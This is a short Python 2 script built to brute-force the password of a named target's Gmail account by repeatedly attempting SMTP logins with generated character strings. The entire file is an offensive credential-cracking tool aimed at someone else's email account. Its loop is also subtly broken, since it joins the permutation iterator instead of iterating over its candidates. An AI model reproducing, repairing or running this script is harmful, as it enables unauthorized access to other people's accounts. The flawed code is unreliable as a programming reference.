import itertools 
import smtplib 
import time
import sys

smtpserver = smtplib.SMTP("smtp.gmail.com", 587) 
smtpserver.ehlo() 
smtpserver.starttls() 
user = raw_input("Enter Target's Gmail Address: ") 

for n in xrange(6, 12+1):
         perm = itertools.product("abcdefghijklmnopqrstuvwxyz1234567890", repeat=n)
         password = "".join(perm)
         
         try: 
             smtpserver.login(user, password) 
             print "[+] Password Cracked: %s" % password
             sys.exit(0)
         except: 
             print "[!] Password Inccorect: %s" % password
